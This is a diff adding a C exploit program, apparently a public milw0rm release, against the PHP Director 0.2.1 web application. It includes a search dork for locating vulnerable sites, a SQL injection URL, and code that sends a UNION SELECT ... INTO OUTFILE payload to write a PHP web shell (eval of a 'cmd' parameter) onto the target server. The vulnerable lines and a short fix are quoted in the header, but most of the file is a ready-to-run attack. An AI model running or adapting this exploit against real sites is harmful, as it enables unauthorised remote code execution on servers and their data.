@@ -1,0 +1,109 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+
+/* Dork "Powered by PHP Director 0.2"   
+   
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+| PHP Director 0.2.1 (sql into outfile) eval() Injection Exploit | 
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
+  
+ {Exploit}-> index.php?cat=%27+UNION+SELECT+1,'lol',3,4,5,6,7,8,9,10,11,12,13,14,15+INTO+OUTFILE+'/var/www/ex.php'/*
+ {PHP.ini}-> Magic Quotes off
+ {Written}-> by Juri Gianni aka yeat - staker[at]hotmail[dot]it 
+ {WhereIs}-> http://sourceforge.net/projects/phpdirector/
+ {Compile}-> gcc -o exploit exploit.c 
+ 
+ 
+ {Details}-> index.php (line 56-58)
+  
+ 56. }elseif (isset($_GET["cat"])) {
+ 57. $cat = $_GET["cat"];
+ 58. $_query = sprintf("SELECT SQL_CALC_FOUND_ROWS * FROM pp_files WHERE `category` = '$cat etc..)
+  
+ {Bug}-> $cat variable is not checked so we have a sql injection
+ {Fix}-> $cat = mysql_real_escape_string($_GET['cat']);
+ 
+
+
+ yeat@lulz:~/Desktop$ gcc -o exploit exploit.c
+ yeat@lulz:~/Desktop$ ./exploit localhost /cms /var/www/shell.php
+ Exploit successful..shell: /var/www/shell.php
+
+*/
+
+
+
+#define GET  "GET %s/index.php?cat=%s HTTP/1.1\r\n" \
+             "Host: %s\r\n" \
+             "User-Agent: Links (2.1pre26; Linux 2.6.19-gentoo-r5 x86_64; x)\r\n" \
+             "Connection: close\r\n\r\n"
+
+#define Exec  "'+UNION+SELECT+1,2,3,4,'<?eval(stripslashes($_GET[cmd]));?>'"\
+              ",6,7,8,9,10,11,12,13,14,15+INTO+OUTFILE+'%s'"
+
+
+char *getHost (char *host)
+{ 
+    struct hostent *hp;
+    struct in_addr **y;
+    
+    hp = gethostbyname(host);
+    y = (struct in_addr **)hp->h_addr_list;
+    
+    return inet_ntoa(**y);
+}
+
+
+int main (int argc,char **argv)
+{
+    int server,leak;
+    char data[1024],html[1024];
+    char packet[500],loadsf[500];
+
+    struct sockaddr_in addr;
+    
+    if (argc < 3) {
+       printf("Usage: %s host path file\n",argv[0]);
+       printf("RunEx: %s localhost /cms /var/www/shell.php\n",argv[0]);
+       exit(0);
+    }   
+    
+    server = socket(AF_INET,SOCK_STREAM,0);
+    
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons((int)80);
+    addr.sin_addr.s_addr = inet_addr(getHost(argv[1]));
+    
+    leak = connect(server,(struct sockaddr*)&addr,sizeof(addr));
+    
+    if (leak < 0) {
+       printf("connection refused..try again\n");
+       exit(0);
+    }   
+    
+    snprintf(loadsf,sizeof(loadsf),Exec,argv[3]); 
+    strncat(loadsf,"%23",sizeof(loadsf));   
+    snprintf(packet,sizeof(packet),GET,argv[2],loadsf,argv[1]);   
+        
+    if (send(server,packet,sizeof(packet),0) < 0) {
+       printf("data sent error..\n");
+    }   
+       
+    while(recv(server,html,sizeof(html),0) > 0) 
+    {   
+        if (strstr(html,"MySQL") || strstr(html,"mysql_fetch_array")) {
+           printf("Exploit unsuccessful..\n"); break;
+        } 
+        else {  
+           printf("Exploit successful..shell: %s\n",argv[3]); break;
+        }   
+   }  
+    
+    return 0;
+}
+
+// milw0rm.com [2009-03-09]
